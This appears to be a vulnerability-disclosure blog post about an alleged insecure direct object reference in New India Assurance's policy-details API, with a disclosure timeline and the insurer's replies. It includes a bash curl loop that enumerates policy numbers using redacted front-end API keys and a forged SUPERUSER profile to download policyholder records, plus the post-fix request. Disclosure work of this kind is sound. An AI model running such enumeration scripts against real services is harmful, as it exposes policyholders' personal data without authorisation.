---
title: The New India Assurance Co Ltd Alleged Vulnerability 2024
date:
  created: 2025-08-13
  updated: 2025-09-12
---

An alleged vulnerability in the [New India Assurance](https://www.newindia.co.in/portal/login/customer) website allowed downloading sensitive personal information of policyholder simply by the policy number.

Summary of the alleged vulnerabilities:

| Sr | API  | Date reported | Date fixed | Days taken | CERT-in reference number |
|----|------|---------------|------------|------------|--------------------------|
| 1  | [getPolicyDetails](#1-getpolicydetails)  | 31 October 2024 | before 18 November 2024 | Less than 18 | not assigned due to non-reproducibility (due to delay in reporting it to CERT after reporting it to NIA) |

Alleged root cause in [OWASP](https://cheatsheetseries.owasp.org/index.html) terms:

- A01 2021 Broken Access Control: CWE-35 Path Traversal, CWE-284 Improper Access Control, CWE-285 Improper Authorization
- A04 2021 Insecure Design: Insecure Direct Object Reference
- A07 2021 Identification and Authentication Failures: CWE-287 Improper Authentication, CWE-613 Insufficient Session Expiration

It is important to note that the **company denied existence** of any vulnerability.

<!-- more -->

> Thank you for your valuable feedback. We would like to inform you that your
> concerns have been reviewed by the relevant team, and it has been confirmed that
> the system does not permit downloading of other insured details. We assure you that
> NIA is committed to maintaining the safety and security of the customers and will
> continue to do so.
> We consider the matter resolved and are closing it accordingly.

After providing them with a sample JSON file, they replied as follows:

> Dear Sir,
>
> Thank you very much for your revert and inputs.
>
> We really appreciate your concern on the matter and seriousness associated with it.
>
The  fact of matter is that we are having a managed SOC and as soon as we received your alert, we had shared the same with our partners for their response post which immediately we sought the services of Cert-In empanelled  Independent Assurance Auditor. Based on their observations, we updated both Cert-In as well as IRDA on this issue and shared our response to your query.  There was no intention of covering up and NIA believes in collaborative efforts to mitigate vulnerabilities. We are very much interested to learn more on this issue/other cyber security related  issues from you and our INFOSEC team will > coordinate with you to seek your appointment and meet you in person, if it is acceptable to you, to learn more and to infuse improvements.
>
> We once again thank you for the inputs and support.
>
> $$$
>
> Chief Manager,
>
> Corporate Finance & Accounts Dept.,
-----

### 1. getPolicyDetails

The API relied on headers `api_key` and `checksum` but these were available in the front-end code itself, and were not tied to any user session. `userid` and customer ID were also not authenticated or signed.

```bash title="sample_script.sh" linenums="1" hl_lines="2 6 7 10"
#!/bin/bash
for POLICY_NUMBER in $$$$$$$$ $$$$$$$$; do
    curl 'https://www.newindia.co.in/BaNCSIntegrationWebComp/rest/commoncomponent/getPolicyDetails' -X POST \
    -H 'customerName: CUSTOMER' \
    -H 'typeOfCustomer: CUSTOMER' \
    -H 'api_key: $$$$$$$$' \
    -H 'checksum: $$$$$$$$' \
    -H 'applicationid: portal' \
    -H 'userid: CUSTCG0000' \
    --data-raw '{"userProfile":{"userId":"CUSTCG0000","loggedInRole":"SUPERUSER"},"quote":{"policyNumber":"'"$POLICY_NUMBER"'","processType":"NB","productCode":"PU"},"productCode":"PU"}' \
    -o policy_leak_$POLICY_NUMBER.json
done
```

<details>
<summary>Sample output</summary>
```json linenums="1"
---8<--- "docs/vuln/posts/content_nia/nia_vuln_1.json"
```
</details>

### $$ Alleged fix

After the alleged fix, the new curl request was as follows. Observe the new header `X-Auth-Token` and the additional `Cookie` header.

```bash title="sample_script_fixed.sh" linenums="1" hl_lines="2 8"
curl 'https://www.newindia.co.in/BaNCSIntegrationWebComp/rest/commoncomponent/getPolicyDetails' -X POST \
 -H 'X-Auth-Token: $$$$$$$$' \
 -H 'customerName: CUSTOMER' \
 -H 'typeOfCustomer: CUSTOMER' \
 -H 'api_key: $$$$$$$$' \
 -H 'checksum: $$$$' \
 -H 'applicationid: portal' \
 -H 'Cookie: citrix_ns_id=$$$$$$$$' \
 -H 'userid: CUSTCG0000' \
 --data-raw '{"userProfile":{"userId":"CUSTCG0000","loggedInRole":"SUPERUSER"},"quote":{"policyNumber":"$$$$$$$$","processType":"NB","productCode":"PU"},"productCode":"PU"}'
```
